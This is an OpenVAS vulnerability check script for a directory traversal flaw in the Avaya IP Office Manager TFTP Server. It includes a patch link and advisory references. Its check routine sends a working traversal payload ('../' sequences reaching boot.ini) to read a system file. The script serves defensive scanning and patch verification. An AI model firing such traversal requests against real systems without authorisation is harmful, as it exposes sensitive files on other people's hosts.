###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_avaya_ip_office_mgr_tftp_dir_trav.nasl 13 2013-10-27 12:16:33Z jan $
#
# Avaya IP Office Manager TFTP Server Directory Traversal Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to read arbitrary files on the
  affected application.
  Impact Level: Application";
tag_affected = "Avaya IP Office Manager TFTP Server Version 8.1 and prior.";
tag_insight = "The flaw is due to an error while handling certain requests containing
  'dot dot' sequences (..), which can be exploited to download arbitrary files
  from the host system.";
tag_solution = "Apply the patch from below link,
  http://support.avaya.com/css/P8/documents/100141179";
tag_summary = "The host is running Avaya IP Office Manager TFTP Server and is
  prone to directory traversal vulnerability.";

if(description)
{
  script_id(802027);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-14 13:16:44 +0200 (Thu, 14 Jul 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Avaya IP Office Manager TFTP Server Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secpod.org/blog/?p=225");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/48272");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17507");
  script_xref(name : "URL" , value : "http://support.avaya.com/css/P8/documents/100141179");
  script_xref(name : "URL" , value : "http://secpod.org/SECPOD_Exploit-Avaya-IP-Manager-Dir-Trav.py");
  script_xref(name : "URL" , value : "http://secpod.org/advisories/SECPOD_Avaya_IP_Manager_TFTP_Dir_Trav.txt");

  script_description(desc);
  script_summary("Check for the directory traversal attack on Avaya IP Office Manager TFTP Server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Remote file access");
  script_dependencies("tftpd_detect.nasl");
  script_require_keys("Services/udp/tftp");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}
##
## The script code starts here
##

include("tftp.inc");

## Check fot tftp service
port = get_kb_item("Services/udp/tftp");
if(!port){
  port = 69;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Try The Exploit
response = tftp_get(port:port, path:"../../../../../../../../../" +
                                    "../../../boot.ini");
if(isnull(response)){
  exit(0);
}

## Check The Response
if("[boot loader]" >< response){
  security_warning(port:port);
}
